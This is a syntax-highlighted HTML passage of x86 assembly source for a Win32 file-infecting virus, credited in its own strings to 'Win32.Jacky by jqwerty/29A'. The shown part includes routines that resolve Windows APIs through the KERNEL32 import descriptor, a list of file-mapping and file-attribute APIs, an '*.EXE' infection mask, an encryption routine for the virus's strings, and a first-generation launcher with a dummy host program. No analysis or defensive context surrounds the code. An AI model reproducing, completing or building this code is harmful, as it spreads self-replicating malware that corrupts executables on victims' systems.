        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">       </span><span class="sc1">;this dynamic variable will hold an RVA</span><span class="sc0">
</span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;pointer to the GetProcAddress API in</span><span class="sc0">
                                    </span><span class="sc1">;the IAT</span><span class="sc0">
</span><span class="sc5">gotoGetProcAddressET</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">GetProcAddressET</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esp.Arg2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;call the original GetProcAddress API</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">gotoGetProcAddressET</span><span class="sc0">  </span><span class="sc1">;if error, call my own GetProcAddress</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">;function</span><span class="sc0">

</span><span class="sc5">MyGetProcAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandleA</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc1">;this function retrieves the base address/module</span><span class="sc0">
                        </span><span class="sc1">;handle of a DLL module previosly loaded to memory.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">        </span><span class="sc1">;this dynamic variable will hold an RVA</span><span class="sc0">
</span><span class="sc5">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;pointer to the GetModuleHandleA API in</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">check_K32</span><span class="sc0">            </span><span class="sc1">;the IAT</span><span class="sc0">

</span><span class="sc5">GetModHandleA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;call the original GetModuleHandleA API</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">really_PE?</span><span class="sc0">

</span><span class="sc5">check_K32</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;this dynamic variable will hold an</span><span class="sc0">
                                        </span><span class="sc1">;RVA pointer to the ForwarderChain</span><span class="sc0">
                                        </span><span class="sc1">;field in the KERNEL32 import</span><span class="sc0">
                                        </span><span class="sc1">;descriptor. This is an undocumented</span><span class="sc0">
</span><span class="sc5">ptrForwarderChain</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">;feature to get the K32 base address</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_GetModHandleA</span><span class="sc0">       </span><span class="sc1">;make sure the base address is ok</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_GetModHandleA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;this dynamic variable will hold the</span><span class="sc0">
                                        </span><span class="sc1">;prev.contents of the ForwarderChain</span><span class="sc0">
                                        </span><span class="sc1">;field in the K32 import descriptor</span><span class="sc0">
</span><span class="sc5">ddForwarderChain</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">;if they match, then the Win32 loader</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_GetModHandleA</span><span class="sc0">       </span><span class="sc1">;didnt copy the K32 base address</span><span class="sc0">

</span><span class="sc5">really_PE?</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">  </span><span class="sc1">;make sure its the base</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">End_GetModHandleA</span><span class="sc0">                   </span><span class="sc1">;address of a PE module</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">End_GetModHandleA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        
</span><span class="sc5">End_GetModHandleA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandleA</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">;set dword alignment</span><span class="sc0">

</span><span class="sc5">v_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;uninitialized data     ;these variablez will be addressed in memory, but</span><span class="sc0">
                        </span><span class="sc1">;dont waste space in the file</span><span class="sc0">

</span><span class="sc5">pv_start</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to virus start in memory</span><span class="sc0">
</span><span class="sc5">phost_hdr</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;ptr to the host base address in mem</span><span class="sc0">
</span><span class="sc5">K32Mod</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;KERNEL32 base address</span><span class="sc0">

</span><span class="sc5">FunctionAddressez</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;these variables will hold the API function addressez</span><span class="sc0">
                        </span><span class="sc1">;used in the virus</span><span class="sc0">

</span><span class="sc5">ddCreateFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCloseHandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddMapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindFirstFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindNextFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindClose</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFilePointer</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetEndOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileTime</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">v_stringz</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;the API names used by the virus are decrypted here</span><span class="sc0">

</span><span class="sc5">vszKernel32</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetModuleHandleA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetProcAddress</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EXE_filez</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;the file mask</span><span class="sc0">

</span><span class="sc5">FunctionNamez</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">vszCreateFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCreateFileMappingA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCloseHandle</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszUnmapViewOfFile</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszMapViewOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindFirstFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindNextFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindClose</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFileAttributesA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFilePointer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetEndOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFileTime</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EndOfFunctionNames</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">FindData</span><span class="sc0">        </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;this routine will be called only once from the first</span><span class="sc0">
                    </span><span class="sc1">;generation sample, it simply initializes some variables</span><span class="sc0">
                    </span><span class="sc1">;needed in the very first run.</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_host</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">here</span><span class="sc0">
</span><span class="sc5">here</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">here</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">delta_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set delta host value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">here</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_start_rva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;set pointer to</span><span class="sc0">
                                                        </span><span class="sc1">;host's base adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pfnGMH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">         </span><span class="sc1">; JMP [nnnnnnnn]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set GetModuleHandleA</span><span class="sc0">
                                                        </span><span class="sc1">;RVA pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pfnGPA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">         </span><span class="sc1">; JMP [nnnnnnnn]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;set GetProcAddress</span><span class="sc0">
                                                        </span><span class="sc1">;RVA pointer</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;encrypt unencrypted API namez and other</span><span class="sc0">
                                </span><span class="sc1">;stringz</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ve_string_size</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_back</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">v_start</span><span class="sc0">         </span><span class="sc1">;ok, here we go.. jump to virus start..</span><span class="sc0">

</span><span class="sc5">crypt_back</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;encryption routine</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt_back</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pfnGMH</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">pfnGPA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

</span><span class="sc1">;Host code starts here</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;here begins the original host code</span><span class="sc0">

</span><span class="sc1">;Display Message box</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"(c) Win32.Jacky by jqwerty/29A"</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"First generation sample"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc1">;Exit host</span><span class="sc0">

</span><span class="sc5">exit_host</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">first_generation</span><span class="sc0">
</span></div></body>
</html>
